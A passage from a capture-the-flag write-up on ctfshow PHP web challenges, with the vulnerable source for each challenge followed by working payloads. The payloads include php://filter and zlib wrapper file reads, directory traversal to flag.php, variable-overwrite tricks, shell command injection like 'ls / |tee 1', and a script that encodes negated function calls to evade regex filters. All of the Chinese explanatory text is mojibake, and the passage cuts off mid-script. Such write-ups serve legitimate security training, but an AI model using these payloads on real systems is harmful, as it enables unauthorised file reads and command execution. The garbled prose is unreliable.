ä¸èƒ½åŒ…å«ç‰¹æ®Šç¬¦å·ä¸æ•°å­—ï¼Œv1 å¿…é¡»åŒ…å« ctfshow</p><p><strong>åˆ†æ</strong>ï¼š</p><p>ã€€ã€€1ã€getFlag ä¸­ä½¿ç”¨ var_dump() è¾“å‡º $$v1</p><p>ã€€ã€€ã€€ã€€$$v1 &#x3D; &amp;$$v2</p><p>ã€€ã€€ã€€ã€€$v2 ä¸ºå˜é‡ï¼Œæˆ‘ä»¬çŸ¥é“ï¼Œflag é€šå¸¸å­˜å‚¨åœ¨ $flag å˜é‡ä¸­ï¼Œå› æ­¤ï¼Œä»¤ v2 &#x3D; flagï¼Œåˆ™ç›¸å½“äº $$v1 &#x3D; $flag</p><p>ã€€ã€€ã€€ã€€æ„é€ çš„ payload ä¸º v1&#x3D;ctfshow&amp;v2&#x3D;flag</p><p>ã€€ã€€ã€€ã€€ä½†è¾“å‡ºä¸º NULL</p><p>ã€€ã€€ã€€ã€€<strong>åŸå› </strong>ï¼šï¼ˆå˜é‡èŒƒå›´ï¼‰</p><p>ã€€ã€€ã€€ã€€ã€€ã€€$flag åœ¨è‡ªå®šä¹‰å‡½æ•° getFlag å‡½æ•°ä¸­æ²¡æœ‰å®šä¹‰</p><p>ã€€ã€€ã€€ã€€ã€€ã€€$flag æ˜¯å±äº flag.php ä¸­çš„å˜é‡ï¼Œå¯¹äº getFlag æ˜¯å¤–éƒ¨å˜é‡ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦å°† $flag æ”¹ä¸ºå…¨å±€å˜é‡</p><p>ã€€ã€€2ã€å®šä¹‰å…¨å±€å˜é‡çš„æ ¼å¼ä¸º global $flag</p><p>ã€€ã€€ã€€ã€€å¦‚æœ v2&#x3D;global $flag</p><p>ã€€ã€€ã€€ã€€é¦–å…ˆ $ è¢«å±è”½</p><p>ã€€ã€€ã€€ã€€å…¶æ¬¡ $$v1 &#x3D; &amp;$$v2 ï¼Œæ—¢ $$v1 &#x3D; &amp;$global $flag</p><p>ã€€ã€€3ã€è€ƒè™‘ä½¿ç”¨è¶…å…¨å±€å˜é‡ $GLOBALS</p><p><strong>çŸ¥è¯†ç‚¹</strong></p><p>ã€€ã€€1ã€å¼•ç”¨èµ‹å€¼ &amp;</p><p>ã€€ã€€2ã€å˜é‡èŒƒå›´</p><p>ã€€ã€€3ã€é¢„å®šä¹‰å˜é‡ä¸­çš„è¶…å…¨å±€å˜é‡ $GLOBALS</p><p><strong>payload</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=ctfshow&amp;v2=GLOBALS</span><br></pre></td></tr></table></figure><h4><span id="web112">web112</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-30 23:47:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\.\.\/|http|https|data|input|rot13|base64|string/i&#x27;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(! <span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$file</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hacker!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=flag.php</span><br><span class="line">php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br><span class="line">php://filter/read=convert.quoted-printable-encode/resource=flag.php</span><br><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure><h4><span id="web113">web113</span></h4><p>è€ƒç‚¹ï¼šåˆ©ç”¨å‡½æ•°æ‰€èƒ½å¤„ç†çš„é•¿åº¦é™åˆ¶è¿›è¡Œç›®å½•æº¢å‡º</p><ul><li>è§£æ³•ä¸€</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/p</span><br><span class="line">roc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/pro</span><br><span class="line">c/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/</span><br><span class="line"><span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/<span class="built_in">self</span>/root/proc/se</span><br><span class="line">lf/root/proc/<span class="built_in">self</span>/root/<span class="keyword">var</span>/www/html/flag.php</span><br></pre></td></tr></table></figure><ul><li>è§£æ³•äºŒ</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://flag.php</span><br></pre></td></tr></table></figure><h4><span id="web123">web123</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;fun&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;CTF_SHOW.COM&#x27;</span>])&amp;&amp;!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fl0g&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\&#123;|\&#125;|\&quot;|\&#x27;|\,|\.|\;|\?/&quot;</span>, <span class="variable">$c</span>)&amp;&amp;<span class="variable">$c</span>&lt;=<span class="number">18</span>)&#123;</span><br><span class="line">         <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$c</span>&quot;</span>.<span class="string">&quot;;&quot;</span>);  </span><br><span class="line">         <span class="keyword">if</span>(<span class="variable">$fl0g</span>===<span class="string">&quot;flag_give_me&quot;</span>)&#123;</span><br><span class="line">             <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å…¶ä¸­$c&lt;&#x3D;18ä¸çŸ¥é“æ˜¯å•¥æ„æ€</p><p>phpæ˜¯å¼±ç±»å‹è¯­è¨€ï¼Œå› æ­¤å¦‚æœå­—ç¬¦ä¸²å¼€å¤´æ˜¯å­—æ¯ï¼Œå’Œæ•°å­—æ¯”è¾ƒæ—¶å€™å°±ä¼šè¢«è½¬ä¸º0</p><ul><li><p>æ–¹æ³•ä¸€ï¼šåˆ©ç”¨eval$cç›´æ¥è¾“å‡ºç»“æœ</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="built_in">echo</span> $flag</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Payloadï¼š</span><br><span class="line"> </span><br><span class="line">GETï¼š?a=<span class="number">1</span>+fl0g=flag_give_me</span><br><span class="line">POSTï¼šCTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">parse_str</span>(<span class="variable">$a</span>[<span class="number">1</span>])</span><br><span class="line">                   </span><br><span class="line">GET:?<span class="variable">$fl0g</span>=flag_give_me</span><br><span class="line">POST:CTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">assert</span>(<span class="variable">$a</span>[<span class="number">0</span>])</span><br></pre></td></tr></table></figure><blockquote><p>åˆ©ç”¨$_SERVER[â€˜argvâ€™]ï¼Œåœ¨å¤§ä½¬é‚£çœ‹äº†è¿™ä¸€å‡½æ•°çš„è®²è§£ã€‚</p><p>$_SERVER æ˜¯ä¸€ä¸ªåŒ…å«äº†è¯¸å¦‚å¤´ä¿¡æ¯(header)ã€è·¯å¾„(path)ã€ä»¥åŠè„šæœ¬ä½ç½®(script locations)ç­‰ç­‰ä¿¡æ¯çš„æ•°ç»„ã€‚è¿™ä¸ªæ•°ç»„ä¸­çš„é¡¹ç›®ç”± Web æœåŠ¡å™¨åˆ›å»ºã€‚</p><p>â€˜argvâ€™</p><p>ä¼ é€’ç»™è¯¥è„šæœ¬çš„å‚æ•°çš„æ•°ç»„ã€‚å½“è„šæœ¬ä»¥å‘½ä»¤è¡Œæ–¹å¼è¿è¡Œæ—¶ï¼Œargv å˜é‡ä¼ é€’ç»™ç¨‹åº C è¯­è¨€æ ·å¼çš„å‘½ä»¤è¡Œå‚æ•°ã€‚å½“é€šè¿‡ GET æ–¹å¼è°ƒç”¨æ—¶ï¼Œè¯¥å˜é‡åŒ…å«query stringã€‚</p><p>æ„æ€å°±æ˜¯é€šè¿‡$_SERVER[â€˜argvâ€™]å°†$aå˜æˆæ•°ç»„ï¼Œå†åˆ©ç”¨æ•°ç»„çš„æ€§è´¨å°†fl0g&#x3D;flag_give_meä¼ å…¥ï¼ŒåŒæ—¶è¿˜ç»•è¿‡ç¬¬ä¸€ä¸ªifä¸­çš„!isset($_GET[â€˜fl0gâ€™]))ï¼Œç”¨+æ¥è¿›è¡Œåˆ†éš”ï¼Œä½¿å¾—æ•°ç»„ä¸­æœ‰å¤šä¸ªæ•°å€¼ã€‚</p><p>æ‰§è¡Œevalå‡½æ•°ä¹Ÿå°±æ˜¯æ‰§è¡Œ$cå³æ˜¯parse_str($a[1])ï¼Œä½¿å¾—fl0g&#x3D;flag_give_meï¼Œä»è€Œè¿›å…¥ç¬¬ä¸‰ä¸ªifè¯­å¥ã€‚</p></blockquote><p>åœ¨phpä¸­å˜é‡ååªæœ‰æ•°å­—å­—æ¯ä¸‹åˆ’çº¿ï¼Œè¢«getæˆ–è€…postä¼ å…¥çš„å˜é‡åï¼Œå¦‚æœå«æœ‰ç©ºæ ¼ã€+ã€[åˆ™ä¼šè¢«è½¬åŒ–ä¸º_ï¼Œæ‰€ä»¥æŒ‰ç†æ¥è¯´æˆ‘ä»¬æ„é€ ä¸å‡ºCTF_SHOW.COMè¿™ä¸ªå˜é‡(å› ä¸ºå«æœ‰.)ï¼Œä½†phpä¸­æœ‰ä¸ªç‰¹æ€§å°±æ˜¯å¦‚æœä¼ å…¥[ï¼Œå®ƒè¢«è½¬åŒ–ä¸º_ä¹‹åï¼Œåé¢çš„å­—ç¬¦å°±ä¼šè¢«ä¿ç•™ä¸‹æ¥ä¸ä¼šè¢«æ›¿æ¢</p></li><li><p>æ–¹æ³•ä¸‰ï¼šhighlight_file</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Payloadï¼š</span><br><span class="line"> </span><br><span class="line">GETï¼š?<span class="number">1</span>=flag.php</span><br><span class="line"> </span><br><span class="line">POSTï¼šCTF_SHOW=&amp;CTF[SHOW.COM=&amp;fun=<span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="number">1</span>])</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web127">web127</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-10 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-10 21:52:49</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$ctf_show</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>);</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ç‰¹æ®Šå­—ç¬¦æ£€æµ‹</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\&#123;|\;|\:|\[|\]|\&#125;|\&#x27;|\&quot;|\&lt;|\,|\&gt;|\.|\\\|\//&#x27;</span>, <span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å—¯å“¼ï¼Ÿ&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf_show</span>===<span class="string">&#x27;ilove36d&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°çŸ¥è¯†ç‚¹ï¼š _()æ˜¯ä¸€ä¸ªå‡½æ•°</p><p>_()&#x3D;&#x3D;gettext() æ˜¯gettext()çš„æ‹“å±•å‡½æ•°ï¼Œå¼€å¯textæ‰©å±•ã€‚éœ€è¦phpæ‰©å±•ç›®å½•ä¸‹æœ‰php_gettext.dll</p><p>get_defined_vars()å‡½æ•°</p><p>get_defined_vars â€” è¿”å›ç”±æ‰€æœ‰å·²å®šä¹‰å˜é‡æ‰€ç»„æˆçš„æ•°ç»„ è¿™æ ·å¯ä»¥è·å¾— $flag</p><p>payload: ?f1&#x3D;_&amp;f2&#x3D;get_defined_vars</p><h4><span id="web129">web129</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-13 03:18:40</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$f</span>, <span class="string">&#x27;ctfshow&#x27;</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">readfile</span>(<span class="variable">$f</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™é¢˜æ˜¯è®©æˆ‘ä»¬è¯»å–flag,å½“æ—¶æˆ‘ä»¬ä¼ å…¥çš„å€¼å¿…é¡»åŒ…æ‹¬ctfshowè€Œä¸”ä¸èƒ½å‡ºç°åœ¨å¼€å¤´,ç¬¬ä¸€ååº”å°±æ˜¯ç”¨filterä¼ªåè®®è¯»å–,ä¸­é—´æŠŠctfshowæ›¿æ¢æˆè¿‡æ»¤å™¨çš„åç§°<code>php://filter/ctfshow/resource=flag.php</code>,æˆ–è€…ç›®å½•éå†ä¹Ÿå¯ä»¥</p><ul><li><p>æ–¹æ³•ä¸€ï¼šfilter</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?f=php:<span class="comment">//filter/read=convert.base64-encode|ctfshow/resource=flag.php</span></span><br><span class="line">?f=php:<span class="comment">//filter/|ctfshow/resource=flag.php</span></span><br><span class="line">?f=php:<span class="comment">//filter/ctfshow/resource=flag.php</span></span><br><span class="line">å…·ä½“åŸç†ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥š,å¯èƒ½æ˜¯phpé‡åˆ°æ²¡æœ‰çš„filterå°±ä¼šå¿½ç•¥</span><br></pre></td></tr></table></figure></li><li><p>æ–¹æ³•äºŒï¼šç›®å½•ç»•è¿‡</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?f=/ctfshow/../../../../var/www/html/flag.php</span><br><span class="line">?f=./ctfshow/../flag.php</span><br></pre></td></tr></table></figure></li></ul><h4><span id="web131">web131</span></h4><p><a href="https://www.laruence.com/2010/06/08/1579.html">æ­£åˆ™æœ€å¤§å›æº¯</a></p><h4><span id="web134">web134</span></h4><p>è§£ç­”ï¼šçœ‹åˆ°parse_strå’Œextractã€‚å˜é‡è¦†ç›–<br>ç¬¬ä¸€æ¡ifåˆ¤æ–­ï¼Œè¦æ±‚key1å’Œkey2ä¸èƒ½é€šè¿‡getå’Œpostä¼ é€’ã€‚</p><p>parse_stræ˜¯å¯¹getè¯·æ±‚è¿›è¡Œçš„å†…å®¹è§£ææˆå˜é‡ã€‚ä¾‹å¦‚ä¼ é€’?a&#x3D;1ï¼Œæ‰§è¡Œåå°±æ˜¯$a&#x3D;1ã€‚<br>é‚£ä¹ˆç›¸å¯¹çš„ï¼Œä¼ é€’_POSTï¼Œå°±æ˜¯å¯¹$_POSTè¿›è¡Œèµ‹å€¼ï¼Œæ­£å¥½å°±å¯ä»¥ç»•è¿‡ifæ¡ä»¶å¯¹postçš„é™åˆ¶ã€‚<br>extract() å‡½æ•°ä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚</p><p><code>payloadï¼š?_POST[key1]=36d&amp;_POST[key2]=36d</code></p><h4><span id="web136">web136</span></h4><p><code>tee</code>ç”¨äºæ˜¾ç¤ºç¨‹åºçš„è¾“å‡ºå¹¶å°†å…¶å¤åˆ¶åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ã€‚</p><p><strong>payload</strong>ï¼š<code>?c=ls |tee 1</code>ï¼Œè®¿é—®1å‘ç°å½“å‰ç›®å½•æ²¡æœ‰flagæ–‡ä»¶ã€‚</p><p><code>?c=ls / |tee 1</code>ï¼Œå‘ç°f149_15_h3r3æ–‡ä»¶ã€‚</p><p><code>?c=cat /f149_15_h3r3|tee 1</code>è·å–flagã€‚</p><h4><span id="web141">web141</span></h4><p>æ•°å­—å’Œè¿ç®—ç¬¦æ˜¯å¯ä»¥ä¸€èµ·æ‰§è¡Œå‘½ä»¤çš„ï¼Œå¦‚1+phpinfo()+1;æ˜¯å¯ä»¥æ˜¾ç¤ºphpinfoé¡µé¢çš„ï¼ŒGETä¼ å…¥çš„åªæ˜¯å­—ç¬¦ä¸²â€œ1+phpinfo()+1â€;æ˜¯ä¸èƒ½ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„ï¼Œç»è¿‡evalå¤„ç†åå°±å˜æˆäº†å¯ä»¥æ‰§è¡Œå‘½ä»¤ï¼Œif(preg_match(â€˜&#x2F;^\W+$&#x2F;â€˜, $v3)){çš„å­˜åœ¨æˆ‘ä»¬åªèƒ½ä¼ å…¥éæ•°å­—å­—æ¯ï¼Œä¸è¿‡php7å¯ä»¥ç”¨ï¼ˆâ€˜phpinfoâ€™)()åŠ¨æ€è°ƒç”¨å‡½æ•°ï¼Œå¯ä»¥ç”¨å¼‚æˆ–ç»•è¿‡</p><p>éœ€è¦é€šè¿‡è„šæœ¬ç»•è¿‡</p><p><a href="https://blog.csdn.net/miuzzx/article/details/109143413">phpè„šæœ¬</a></p><p>v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;%2bï¼ˆ+å·ï¼‰æˆ–è€…%2dï¼ˆ-å·ï¼‰åŠ ä¸Šè„šæœ¬ç¼–ç åçš„å­—ç¬¦ä¸²ã€‚</p><ul><li><p><strong>å–å</strong></p><p>å› ä¸ºå–åçš„è¯ï¼ŒåŸºæœ¬ä¸Šç”¨çš„éƒ½æ˜¯ä¸€ä¸ªä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥ä¸ä¼šè§¦å‘åˆ°æ­£åˆ™è¡¨è¾¾å¼</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//åœ¨å‘½ä»¤è¡Œä¸­è¿è¡Œ</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*author yu22x*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$system</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$command</span>=<span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, <span class="title function_ invoke__">fgets</span>(STDIN)); </span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$system</span>).<span class="string">&#x27;)(~&#x27;</span>.<span class="title function_ invoke__">urlencode</span>(~<span class="variable">$command</span>).<span class="string">&#x27;);&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li><p>å¼‚æˆ–å’Œæˆ–æ“ä½œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 